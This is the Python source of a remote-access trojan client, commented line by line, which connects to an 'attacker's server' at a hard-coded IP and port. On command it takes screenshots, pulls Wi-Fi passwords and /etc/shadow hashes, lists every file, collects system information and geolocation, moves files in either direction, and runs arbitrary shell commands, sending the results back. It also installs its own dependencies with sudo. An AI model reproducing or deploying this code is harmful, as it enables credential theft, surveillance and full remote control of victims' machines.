import json  # Import the JSON library for working with JSON data
import socket  # Import the socket library for network communication
import subprocess  # Import the subprocess module for running shell commands
import os  # Import the os module for interacting with the operating system
import time  # Import the time module for time-related functions
import platform  # Import the platform module for system information
import re  # Import the re module for regular expressions
import shutil  # Import the shutil module for checking executable programs

"""
This function checks whether a program is installed on the system. It follows these steps:

- Utilizes the 'shutil.which' function, which returns the path to an executable program if it's found in the system's PATH.
- Returns 'True' if 'shutil.which' returns a valid path (indicating the program is installed), or 'False' if it returns 'None' (indicating the program is not installed).

Parameters:
- program_name: The name of the program to check for installation.
"""
def is_program_installed(program_name): # Function to check if a program is installed
    return shutil.which(program_name) is not None # Return True/False based on if package is installed

# Check if the 'mss', 'psutil' and 'geocoder' libraries are installed
try:
    import mss  # Try importing the 'mss' library for taking screenshots
    mss_installed = True  # Set a flag to indicate that 'mss' is installed
except ImportError:
    mss_installed = False  # Set the flag to indicate that 'mss' is not installed

try:
    import psutil  # Try importing the 'psutil' library for system information
    psutil_installed = True  # Set a flag to indicate that 'psutil' is installed
except ImportError:
    psutil_installed = False  # Set the flag to indicate that 'psutil' is not installed

try:
    import geocoder  # Try importing the 'geocoder' library for geolocation
    geocoder_installed = True  # Set a flag to indicate that 'geocoder' is installed
except ImportError:
    geocoder_installed = False  # Set the flag to indicate that 'geocoder' is not installed

# Function to install 'pip' using apt
def install_pip():
    try:
        subprocess.run(["sudo", "apt", "install", "python3-pip", "-y"])  # Use subprocess to run an apt command to install 'pip'
        return True  # Return True to indicate a successful installation
    except Exception as e:
        print(f"Failed to install 'pip': {str(e)}")  # Print an error message if installation fails
        return False  # Return False to indicate installation failure

# Function to install 'curl' using apt
def install_curl():
    try:
        subprocess.run(["sudo", "apt", "install", "curl", "-y"])  # Use subprocess to run an apt command to install 'curl'
        return True  # Return True to indicate a successful installation
    except Exception as e:
        print(f"Failed to install 'curl': {str(e)}")  # Print an error message if installation fails
        return False  # Return False to indicate installation failure

# Function to install the 'mss' library using pip
def install_mss():
    try:
        subprocess.run(["pip", "install", "mss"])  # Use subprocess to run a pip command to install 'mss'
        return True  # Return True to indicate a successful installation
    except Exception as e:
        print(f"Failed to install 'mss' library: {str(e)}")  # Print an error message if installation fails
        return False  # Return False to indicate installation failure

# Function to install the 'psutil' library using pip
def install_psutil():
    try:
        subprocess.run(["pip", "install", "psutil"])  # Use subprocess to run a pip command to install 'psutil'
        return True  # Return True to indicate a successful installation
    except Exception as e:
        print(f"Failed to install 'psutil' library: {str(e)}")  # Print an error message if installation fails
        return False  # Return False to indicate installation failure

# Function to install the 'geocoder' library using pip
def install_geocoder():
    try:
        subprocess.run(["pip", "install", "geocoder"])  # Use subprocess to run a pip command to install 'geocoder'
        return True  # Return True to indicate a successful installation
    except Exception as e:
        print(f"Failed to install 'geocoder' library: {str(e)}")  # Print an error message if installation fails
        return False  # Return False to indicate installation failur

# Check if 'pip' is not installed and install it if needed
if not is_program_installed("pip"): # Check if 'pip' is not installed
    print("The 'pip' program is not installed. Installing it now...") # Print a message indicating installation
    if install_pip(): # Call the install_pip() function to attempt installation
        print("The 'pip' program has been installed successfully.") # Print a success message
        print()  # Print a blank line for readability
    else:
        print("Failed to install the 'pip' program.") # Print an error message if installation fails
    print() # Print a blank line for readability

# Check if 'curl' is not installed and install it if needed
if not is_program_installed("curl"):
    print("The 'curl' program is not installed. Installing it now...")
    if install_curl():
        print("The 'curl' program has been installed successfully.")
        print()  # Print a blank line for readability
    else:
        print("Failed to install the 'curl' program.") # Print an error message if installation fails
    print() # Print a blank line for readability

# Check if 'mss', 'psutil', and 'geocoder' are installed, and install them if needed
if not mss_installed:  # Check if 'mss' is not installed
    print("The 'mss' library is not installed. Installing it now...")  # Print a message indicating installation
    if install_mss():  # Call the install_mss() function to attempt installation
        print("The 'mss' library has been installed successfully.")  # Print a success message
        mss_installed = True  # Set the flag to indicate that 'mss' is now installed
        import mss  # Import the 'mss' library for immediate use
        print("The 'mss' library has been imported successfully.")  # Print a success message
        print()  # Print a blank line for readability
    else:
        print("Failed to install the 'mss' library.")  # Print an error message if installation fails
        print()  # Print a blank line for readability

if not psutil_installed:  # Check if 'psutil' is not installed
    print("The 'psutil' library is not installed. Installing it now...")  # Print a message indicating installation
    if install_psutil():  # Call the install_psutil() function to attempt installation
        print("The 'psutil' library has been installed successfully.")  # Print a success message
        psutil_installed = True  # Set the flag to indicate that 'psutil' is now installed
        import psutil  # Import the 'psutil' library for immediate use
        print("The 'psutil' library has been imported successfully.")  # Print a success message
        print()  # Print a blank line for readability
    else:
        print("Failed to install the 'psutil' library.")  # Print an error message if installation fails
        print()  # Print a blank line for readability

if not geocoder_installed:  # Check if 'geocoder' is not installed
    print("The 'geocoder' library is not installed. Installing it now...")  # Print a message indicating installation
    if install_geocoder():  # Call the install_geocoder() function to attempt installation
        print("The 'geocoder' library has been installed successfully.")  # Print a success message
        geocoder_installed = True  # Set the flag to indicate that 'geocoder' is now installed
        import geocoder  # Import the 'geocoder' library for immediate use
        print("The 'geocoder' library has been imported successfully.")  # Print a success message
        print()  # Print a blank line for readability
    else:
        print("Failed to install the 'geocoder' library.")  # Print an error message if installation fails
        print()  # Print a blank line for readability)

# Check if both 'mss' and 'psutil' are installed before proceeding
if not (mss_installed and psutil_installed and geocoder_installed):  # Check if any of the required libraries are missing
    print("Required libraries are not installed, try manually installing 'mss', 'psutil' and 'geocoder'.  Exiting!!!")  # Print an error message and exit the program
    exit()  # Exit the program
else:
    print()  # Print a blank line for readability
    print("All dependencies exist. Let's start the connection with the server.")  # Print a success message
    print()  # Print a blank line for readability

"""
This function executes the 'get_geolocation' command, which retrieves the geolocation information of the target system.
It follows these steps:
1. Fetch the public IP address of the target system using 'curl' and strip any whitespace.
2. Use the geocoder library to retrieve geolocation information based on the public IP address.
3. If geolocation information is available, create a dictionary containing IP address, city, country, latitude, and longitude.
4. Generate a timestamp and save the geolocation information to a JSON file with the timestamp in the filename.
5. Send the geolocation file to a server using the 'send_file' function.
6. Print a success message if everything is successful, or send an error message to the server and print an error message if any exceptions occur.
"""
def execute_get_geolocation(): # Function to execute the 'get_geolocation' command
    try:
        public_ip = subprocess.check_output(["curl", "ifconfig.me"], universal_newlines=True).strip() # Get the public IP address of the target system and strip any whitespace

        g = geocoder.ip(public_ip) # Use geocoder to retrieve the geolocation information based on the IP address

        # Check if the geocoder was successful and create a geolocation_info dictionary
        if g.ok:
            geolocation_info = {"IP Address": g.ip, 
                                "City": g.city, 
                                "Country": g.country,
                                "Latitude": g.latlng[0], 
                                "Longitude": g.latlng[1]
            }

            # Save the geolocation information to a JSON file with a timestamp in the filename
            timestamp = int(time.time())
            geolocation_filename = f"/tmp/{timestamp}_geolocation.json"
            with open(geolocation_filename, "w") as geo_file:
                json.dump(geolocation_info, geo_file, indent=4)

            # Send the geolocation file to the server
            send_file(client_socket, geolocation_filename)
            print("Geolocation information sent to the server and saved to file.")
            print()
        else:
            error_message = f"Geolocation information not available for IP: {public_ip}"
            client_socket.send(error_message.encode())  # Send an error message to the server
            print(error_message)  # Print the error message

        print()

    except Exception as e:
        error_message = str(e)
        client_socket.send(error_message.encode())  # Send an error message to the server
        print(f"An error occurred: {error_message}")  # Print an error message

"""
This function retrieves various system information, including OS details, CPU information, RAM, disk, network, GPU, BIOS/UEFI, motherboard, installed software, system logs, and current user information.
It follows these steps:
1. Collect basic system information, such as OS name, version, and architecture.
2. Gather CPU information, including CPU name, core count, and logical CPU count.
3. Retrieve RAM information and display total RAM in GB.
4. Fetch disk information, including device name, mount point, total space, used space, and free space in GB.
5. Collect network information, listing network interfaces, their addresses, netmasks, broadcast addresses, and point-to-point addresses.
6. Retrieve GPU information using the 'lspci' command.
7. Gather BIOS/UEFI information using 'dmidecode'.
8. Collect motherboard information using 'dmidecode'.
9. Get a list of installed software packages on Linux using package managers like 'dpkg' or 'rpm'.
10. Display the last 10 lines of system logs using 'journalctl'.
11. Get information about the current user, including username, UID, and GID.

The function combines all collected information into a formatted string and returns it as the final system information report.
"""
def get_system_info(): # Function to retrieve system information
    try:
        system_info = []  # Create an empty list to store system information

        # Get basic system information
        system_info.append(f"OS: {platform.system()}")  # Append OS name to the list
        system_info.append(f"OS Version: {platform.release()}")  # Append OS version to the list
        system_info.append(f"Architecture: {' '.join(platform.architecture())}")  # Append system architecture to the list

        # Get CPU information
        system_info.append(f"CPU: {platform.processor()}")  # Append CPU name to the list
        system_info.append(f"CPU Cores: {psutil.cpu_count(logical=False)}")  # Append CPU core count to the list
        system_info.append(f"Logical CPUs: {psutil.cpu_count(logical=True)}")  # Append logical CPU count to the list

        # Get RAM information
        mem = psutil.virtual_memory()  # Get virtual memory information
        system_info.append(f"Total RAM: {mem.total / (1024**3):.2f} GB")  # Append total RAM to the list in GB

        # Get disk information
        partitions = psutil.disk_partitions()  # Get disk partitions
        system_info.append("Disk Info:")  # Append a header for disk information
        for partition in partitions:
            usage = psutil.disk_usage(partition.mountpoint)  # Get disk usage information
            system_info.append(f"  Device: {partition.device}")  # Append device name to the list
            system_info.append(f"  Mount Point: {partition.mountpoint}")  # Append mount point to the list
            system_info.append(f"  Total Space: {usage.total / (1024**3):.2f} GB")  # Append total space to the list in GB
            system_info.append(f"  Used Space: {usage.used / (1024**3):.2f} GB")  # Append used space to the list in GB
            system_info.append(f"  Free Space: {usage.free / (1024**3):.2f} GB")  # Append free space to the list in GB

        # Get network information
        network_info = psutil.net_if_addrs()  # Get network interface addresses
        system_info.append("Network Info:")  # Append a header for network information
        for interface, addresses in network_info.items():
            system_info.append(f"  Interface: {interface}")  # Append interface name to the list
            for addr in addresses:
                system_info.append(f"    Family: {addr.family.name}")  # Append address family to the list
                system_info.append(f"    Address: {addr.address}")  # Append address to the list
                system_info.append(f"    Netmask: {addr.netmask}")  # Append netmask to the list
                system_info.append(f"    Broadcast: {addr.broadcast}")  # Append broadcast address to the list
                system_info.append(f"    PTP: {addr.ptp}")  # Append point-to-point address to the list

        # Get GPU information
        def get_gpu_info():
            try:
                lspci_output = subprocess.check_output(['lspci'], universal_newlines=True)  # Get GPU information using lspci command
                return f"GPU Information:\n{lspci_output}"  # Return GPU information as a formatted string
            except Exception as e:
                return str(e)

        system_info.append(get_gpu_info())  # Append GPU information to the list

        # Get BIOS/UEFI information
        def get_bios_info():
            try:
                dmidecode_output = subprocess.check_output(['sudo', 'dmidecode'], universal_newlines=True)  # Get BIOS/UEFI information using dmidecode command
                return f"BIOS/UEFI Information:\n{dmidecode_output}"  # Return BIOS/UEFI information as a formatted string
            except Exception as e:
                return str(e)

        system_info.append(get_bios_info())  # Append BIOS/UEFI information to the list

        # Get motherboard information
        def get_motherboard_info():
            try:
                dmidecode_output = subprocess.check_output(['sudo', 'dmidecode', '-t', 'baseboard'], universal_newlines=True)  # Get motherboard information using dmidecode command
                return f"Motherboard Information:\n{dmidecode_output}"  # Return motherboard information as a formatted string
            except Exception as e:
                return str(e)

        system_info.append(get_motherboard_info())  # Append motherboard information to the list

        # Get installed software information
        def get_installed_software():
            try:
                installed_software = {}  # Create a dictionary to store installed software information
                if platform.system() == 'Linux':  # Check if the system is Linux
                    if os.path.exists('/usr/bin/dpkg'):  # Check if dpkg package manager exists
                        package_manager = 'dpkg'
                    elif os.path.exists('/usr/bin/rpm'):  # Check if rpm package manager exists
                        package_manager = 'rpm'
                    else:
                        package_manager = 'unknown'  # If no known package manager exists

                    if package_manager != 'unknown':
                        list_packages_command = [package_manager, '-l']  # Define the command to list installed packages
                        installed_packages = subprocess.check_output(list_packages_command, universal_newlines=True)  # Get installed packages
                        installed_software['Installed Software'] = installed_packages  # Add installed packages to the dictionary
                return installed_software  # Return the dictionary containing installed software information
            except Exception as e:
                return str(e)

        software_info = get_installed_software()  # Get installed software information
        if 'Installed Software' in software_info:
            system_info.append("Installed Software:")  # Append a header for installed software
            system_info.append(software_info['Installed Software'])  # Append installed software information to the list

        # Combine the formatted system information into a single string
        system_info_text = '\n'.join(system_info)  # Join the list of system information into a single string

        # Get System Logs
        def get_system_logs():
            try:
                logs = subprocess.check_output(['journalctl', '-n', '10', '--no-pager'], universal_newlines=True)  # Get system logs using journalctl command
                return f"System Logs:\n{logs}"  # Return system logs as a formatted string
            except Exception as e:
                return str(e)

        system_info_text += '\n' + get_system_logs()  # Append system logs to the system information text

        # Get Current User Information
        def get_current_user_info():
            try:
                current_user = os.getlogin()  # Get the current user's username
                uid = os.getuid()  # Get the current user's UID
                gid = os.getgid()  # Get the current user's GID
                user_info = (
                    f"Current User Information:\n"
                    f"Username: {current_user}\n"
                    f"UID: {uid}\n"
                    f"GID: {gid}"
                )
                return user_info  # Return current user information as a formatted string
            except Exception as e:
                return str(e)

        system_info_text += '\n' + get_current_user_info()  # Append current user information to the system information text

        return system_info_text  # Return the final system information as a formatted string

    except Exception as e:
        return str(e)

"""
This function sends a file over a socket without chunking and provides an option to delete the file afterward. It follows these steps:
1. Open the specified file in binary read mode.
2. Read the file data.
3. Send the size of the file as a 4-byte integer to the server.
4. Send the file data to the server.
5. Print a success message if the file is sent successfully.
6. Optionally, delete the file from the client's /tmp/ folder.
7. Print a success message if the file deletion is successful or an error message if deletion fails.

Parameters:
- client_socket: The socket used for communication with the server.
- filename: The name of the file to be sent.
- delete_after: A boolean flag indicating whether to delete the file from the client's /tmp/ folder after sending (default is True).
"""
def send_file(client_socket, filename, delete_after=True):# Function to send a file over the socket without chunking and delete it afterward
    try:
        with open(filename, "rb") as file:  # Open the file in binary read mode
            file_data = file.read()  # Read the file data
            client_socket.send(len(file_data).to_bytes(4, byteorder='big'))  # Send the file size as a 4-byte integer
            client_socket.send(file_data)  # Send the file data

        print(f"File '{filename}' sent to the server.")  # Print a success message

        if delete_after:
            try:
                os.remove(filename)  # Delete the file from the client's /tmp/ folder
                print(f"File '{filename}' deleted from the client's /tmp/ folder.")  # Print a success message
            except Exception as e:
                print(f"Failed to delete file '{filename}' from the client's /tmp/ folder: {str(e)}")  # Print an error message if deletion fails

    except FileNotFoundError as e:
        print(f"File '{filename}' not found on the client.")  # Print an error message if the file is not found on the client
    except Exception as e:
        print(f"An error occurred while sending the file '{filename}': {str(e)}")  # Print an error message for other exceptions


"""
This function executes the "screenshot" command, capturing a screenshot of the client's screen using the 'mss' library.
It follows these steps:
1. Initialize 'mss' for screen capture.
2. Generate a timestamp to create a unique screenshot file name.
3. Define the file path for the screenshot.
4. Capture the screenshot and save it as a PNG file.
5. Send the screenshot file to the server using the 'send_file' function.
6. Print a success message if the screenshot is sent successfully, or send an error message to the server and print an error message if any exceptions occur.
"""
def execute_screenshot(): # Function to execute the "screenshot" command and send the screenshot file to the server
    try:
        with mss.mss() as sct:  # Initialize mss for screen capture
            timestamp = int(time.time())  # Get a timestamp
            screenshot_path = f"/tmp/screenshot_{timestamp}.png"  # Define the screenshot file path
            screenshot = sct.shot(output=screenshot_path)  # Capture the screenshot and save it

        send_file(client_socket, screenshot_path)  # Send the screenshot file to the server
        print("Screenshot sent to the server.")  # Print a success message
        print()

    except Exception as e:
        error_message = str(e)
        client_socket.send(error_message.encode())  # Send an error message to the server
        print(f"An error occurred: {error_message}")  # Print an error message
        print()

"""
This function executes the 'wifi_passwords_linux' command to extract Wi-Fi passwords from a Linux system.
It follows these steps:
1. Get a timestamp to create a unique output file name.
2. Define the file path for the output file, where the Wi-Fi passwords will be saved.
3. Execute a command using 'subprocess.run' to extract Wi-Fi passwords and save them to the output file.
4. Send the output file containing Wi-Fi passwords to the server using the 'send_file' function.
5. Print a success message if the Wi-Fi passwords are sent successfully or send an error message to the server and print an error message if any exceptions occur.
"""
def execute_wifi_passwords_linux(): # Function to execute the 'wifi_passwords_linux' command
    try:
        timestamp = int(time.time())  # Get a timestamp
        modified_filename = f"/tmp/{timestamp}_wifi_passwords_linux.txt"  # Define the output file path

        # Execute a command to extract Wi-Fi passwords and save them to the output file
        subprocess.run(f'sudo grep -h -E -o "psk=\\S+" /etc/NetworkManager/system-connections/* > {modified_filename}', shell=True)

        send_file(client_socket, modified_filename)  # Send the output file to the server
        print("Wi-Fi passwords (Linux) sent to the server.")  # Print a success message
        print()

    except Exception as e:
        error_message = str(e)
        client_socket.send(error_message.encode())  # Send an error message to the server
        print(f"An error occurred: {error_message}")  # Print an error message
        print()

"""
This function executes the 'get_file_list' command to list all files and directories on the system and sends the list to the server.
It follows these steps:
1. Get a timestamp to create a unique output file name.
2. Define the file path for the output file, where the list of files and directories will be saved.
3. Execute a command using 'subprocess.run' to list all files and directories on the system and save them to the output file.
4. Send the output file containing the list to the server using the 'send_file' function.
5. Print a success message if the list is sent successfully or send an error message to the server and print an error message if any exceptions occur.
"""
def execute_get_file_list(): # Function to execute the 'get_file_list' command
    try:
        timestamp = int(time.time())  # Get a timestamp
        modified_filename = f"/tmp/{timestamp}_all_dir_file_list.txt"  # Define the output file path

        # Execute a command to list all files and directories on the system and save them to the output file
        subprocess.run(f'sudo find / -type f -o -type d 2>/dev/null > {modified_filename}', shell=True)

        send_file(client_socket, modified_filename)  # Send the output file to the server
        print("All Dir & File list sent to the server.")  # Print a success message
        print()

    except Exception as e:
        error_message = str(e)
        client_socket.send(error_message.encode())  # Send an error message to the server
        print(f"An error occurred: {error_message}")  # Print an error message
        print()

"""
This function executes the 'get_system_info' command to retrieve various system information and sends it to the server.
It follows these steps:
1. Get a timestamp to create a unique output file name.
2. Define the file path for the output file, where the system information will be saved.
3. Retrieve system information using the 'get_system_info' function.
4. Save the system information to the output file.
5. Send the output file containing the system information to the server using the 'send_file' function.
6. Print a success message if the system information is sent successfully or send an error message to the server and print an error message if any exceptions occur.
"""
def execute_get_system_info(): # Function to execute the 'get_system_info' command
    try:
        timestamp = int(time.time())  # Get a timestamp
        modified_filename = f"/tmp/{timestamp}_system_info.txt"  # Define the output file path
        
        # Get system information
        system_info = get_system_info()
        
        # Save system information to a file
        with open(modified_filename, "w") as file:
            file.write(str(system_info))
        
        # Send the file to the server
        send_file(client_socket, modified_filename)  # Send the output file to the server
        print("System information sent to the server.")  # Print a success message
        print()

    except Exception as e:
        error_message = str(e)
        client_socket.send(error_message.encode())  # Send an error message to the server
        print(f"An error occurred: {error_message}")  # Print an error message
        print()

"""
This function executes the 'get_linux_password_hashes' command to retrieve the password hashes stored in the /etc/shadow file on a Linux system and sends them to the server.
It follows these steps:
1. Get a timestamp to create a unique output file name.
2. Define the file path for the output file, where the password hashes will be saved.
3. Execute a command using 'subprocess.run' to copy the /etc/shadow file to the output file.
4. Send the output file containing the password hashes to the server using the 'send_file' function.
5. Print a success message if the password hashes are sent successfully or send an error message to the server and print an error message if any exceptions occur.
"""
def execute_get_linux_password_hashes(): # Function to execute the 'get_linux_password_hashes' command
    try:
        timestamp = int(time.time())  # Get a timestamp
        modified_filename = f"/tmp/{timestamp}_linux_password_hashes.txt"  # Define the output file path

        # Execute a command to copy the /etc/shadow file to the output file
        subprocess.run(f'sudo cp /etc/shadow {modified_filename}', shell=True)

        send_file(client_socket, modified_filename)  # Send the output file to the server
        print("Password Hashes (Linux) sent to the server.")  # Print a success message
        print()

    except Exception as e:
        error_message = str(e)
        client_socket.send(error_message.encode())  # Send an error message to the server
        print(f"An error occurred: {error_message}")  # Print an error message
        print()

"""
This function executes the 'download_file' command to send a specified file to the server.
It follows these steps:
1. Check if the specified file exists on the client.
2. If the file exists, send it to the server using the 'send_file' function without deleting it.
3. Print a success message if the file is sent successfully or send an error message to the server and print an error message if the file does not exist or if any exceptions occur.

Parameters:
- file_path: The path to the file to be sent to the server.
"""
def execute_download_file(file_path): # Function to execute the 'download_file' command
    try:
        if os.path.exists(file_path):  # Check if the specified file exists
            valid_message = "valid_path"
            client_socket.send(valid_message.encode())
            send_file(client_socket, file_path, delete_after=False)  # Send the file to the server without deleting it
            print()
        else:
            error_message = f"File '{file_path}' does not exist on the client."  # Generate an error message
            client_socket.send(error_message.encode())  # Send the error message to the server
            print(error_message)  # Print the error message
            print()

    except Exception as e:
        error_message = str(e)
        client_socket.send(error_message.encode())  # Send an error message to the server
        print(f"An error occurred: {error_message}")  # Print an error message

"""
This function receives and saves a file on the client side.
It follows these steps:
1. Generate a timestamp to create a unique filename.
2. Extract the base filename and directory name from the provided filename.
3. Add the timestamp as a prefix to the filename to create a modified filename.
4. Receive the 4-byte file size from the server as bytes and convert it to an integer.
5. Receive the file data in chunks until the entire file is received.
6. Save the received file data with the modified filename.
7. Print a success message if the file is received and saved successfully or print an error message if file reception fails or if any exceptions occur.

Parameters:
- client_socket: The socket used for communication with the server.
- filename: The path where the received file will be saved.
"""
def receive_file(client_socket, filename): # Function to receive and save a file on the client side
    try:
        timestamp = int(time.time())  # Generate a timestamp
        base_filename = os.path.basename(filename)  # Get the base filename
        dir_name = os.path.dirname(filename)  # Get the directory name
        modified_filename = os.path.join(dir_name, f"{timestamp}_{base_filename}")  # Add timestamp as a prefix
        
        file_size_bytes = client_socket.recv(4)  # Receive the 4-byte file size as bytes
        file_size = int.from_bytes(file_size_bytes, byteorder='big')  # Convert bytes to an integer
        received_data = b''

        while len(received_data) < file_size:
            data_chunk = client_socket.recv(file_size - len(received_data))  # Receive remaining data
            if not data_chunk:
                break
            received_data += data_chunk

        if len(received_data) == file_size:
            with open(modified_filename, "wb") as file:  # Save with the modified filename
                file.write(received_data)  # Write received data to the file
            print()
            print(f"FILE RECEIVED AND SAVED AS '{modified_filename}'")  # Print a success message
            print()
        else:
            print()
            print("FILE RECEPTION FAILED!!!")  # Print an error message if file reception fails
            print()

    except FileNotFoundError as e:
        print(f"File '{filename}' not found on the server.")  # Print an error message if the file is not found on the server
    except Exception as e:
        print(f"An error occurred while receiving the file '{filename}': {str(e)}")  # Print an error message for other exceptions

"""
This function executes the 'upload_file' command to receive a file from the server and save it in the specified client directory.
It follows these steps:
1. Receive the client directory path from the server.
2. Validate the received client directory path and check if it exists on the client.
3. If the client directory path is valid and exists, send a confirmation message to the server.
4. Receive the file sent by the server and save it in the specified client directory.
5. Print a success message if the file is received and saved successfully, or print an error message if the client directory path is invalid, the directory does not exist on the client, or if any exceptions occur.

Parameters:
- client_socket: The socket used for communication with the server.
- server_file_path: The path to the file on the server that needs to be uploaded to the client.
"""
def execute_upload_file(client_socket, server_file_path): # Function to execute the 'upload_file' command
    try:
        # Receive the client directory path from the server
        client_directory_path = client_socket.recv(1024).decode()

        if validate_linux_file_path(client_directory_path) and os.path.exists(client_directory_path):  # Validate the client directory path
            try:
                # Send a confirmation message to the server
                client_socket.send("valid_directory".encode())
                print("Sent Valid Directory Path confirmation")  # Print a success message

                receive_file(client_socket, os.path.join(client_directory_path, os.path.basename(server_file_path)))  # Receive the file and save it in the client directory
                print(f"File received and saved in the client directory: {client_directory_path}")  # Print a success message
                print()
            except Exception as e:
                error_message = str(e)
                print(f"An error occurred: {error_message}")  # Print an error message
                print()
        else:
            error_message = "Invalid client directory path received from the server or directory does not exist on the client."  # Generate an error message
            print(error_message)  # Print the error message
            print()
            # Send an error message to the server
            client_socket.send(error_message.encode())  # Send the error message to the server

    except Exception as e:
        error_message = str(e)
        print(f"An error occurred: {error_message}")  # Print an error message
        print()

"""
This function validates a file path to ensure it is in a Linux-compatible format.
It follows these steps:
1. Defines a regular expression pattern for a valid Linux file or directory path.
2. Uses the 're.match' function to check if the provided 'file_path' matches the pattern.
3. Returns 'True' if the 'file_path' matches the pattern (indicating it is a valid Linux file path), or 'False' otherwise.

Parameters:
- file_path: The file path to be validated.
"""
def validate_linux_file_path(file_path): # Function to validate a file path in Linux-compatible format
    pattern = r'^(/[^/]+)+(/[^/]+\.\w+)?$' # Define the regular expression pattern for a valid Linux file or directory path
    return bool(re.match(pattern, file_path))  # Check if the file path matches the patternh))

"""
This script serves as a client application that connects to an attacker's server.
It listens for commands from the server and executes various system-related tasks or file transfers based on the received commands.

1. Define the attacker's IP address and port.
2. Create a tuple containing the attacker's address.
3. Create a socket object for the client.
4. Attempt to connect to the attacker's server and print a success message upon connection.
5. Enter a loop to continuously receive and process commands from the server:
    a. Receive a command from the server.
    b. Check the received command and execute the corresponding functionality:
        - Execute screenshot capture if the command is "get_screenshot."
        - Retrieve Wi-Fi passwords on a Linux system if the command is "get_wifi_passwords_linux."
        - Copy Linux password hashes if the command is "get_linux_password_hashes."
        - List all files and directories on the system if the command is "get_file_list."
        - Collect system information if the command is "get_system_info."
        - Fetch geolocation information if the command is "get_geolocation."
        - Download a file from the server if the command starts with "download_file."
        - Upload a file to the server if the command starts with "upload_file."
        - Terminate the connection if the command is "exit."
        - Execute a system command and send its output to the server for other commands.
6. Handle exceptions and print error messages when necessary.
7. Close the client socket when the loop terminates or upon encountering an error.
"""
if __name__ == "__main__":
    attacker_ip = "10.10.10.5" # Define the attacker's IP address
    attacker_port = 8783 # Define the attacker's port

    attacker_address = (attacker_ip, attacker_port) # Create a tuple containing the attacker's address

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a socket object for the client

    try:
        client_socket.connect(attacker_address)  # Connect to the attacker's server
        print(f"Client is connected to: {attacker_ip}:{attacker_port}")  # Print a success message
        print() 

        while True:
            command = client_socket.recv(1024).decode()  # Receive a command from the server

            if command.lower() == "get_screenshot":
                execute_screenshot()  # Execute the "screenshot" command

            elif command.lower() == "get_wifi_passwords_linux":
                execute_wifi_passwords_linux()  # Execute the "get_wifi_passwords_linux" command

            elif command.lower() == "get_linux_password_hashes":
                execute_get_linux_password_hashes()  # Execute the "get_linux_password_hashes" command

            elif command.lower() == "get_file_list":
                execute_get_file_list()  # Execute the "get_file_list" command

            elif command.lower() == "get_system_info":
                execute_get_system_info()  # Execute the "get_system_info" command

            elif command.lower() == "get_geolocation":
                execute_get_geolocation()  # Execute the "get_geolocation" command

            elif command.startswith("download_file "):
                file_path = command[len("download_file "):] # Extract the file path from the command
                execute_download_file(file_path)  # Execute the "download_file" command

            elif command.startswith("upload_file "):
                server_file_path = command[len("upload_file "):] # Extract the server file path from the command
                execute_upload_file(client_socket, server_file_path)  # Execute the "upload_file" command

            elif command.lower() == "exit":
                print()
                print("CONNECTION WITH THE SERVER IS TERMINATED!!!")  # Print a termination message
                break

            else:
                try:
                    output = subprocess.getoutput(command)  # Execute a system command and capture its output
                except Exception as e:
                    output = str(e)

                client_socket.send(output.encode())  # Send the command output to the server

    except Exception as e:
        print(f"An error occurred: {str(e)}")  # Print an error message
        print()

    finally:
        client_socket.close()  # Close the client socket
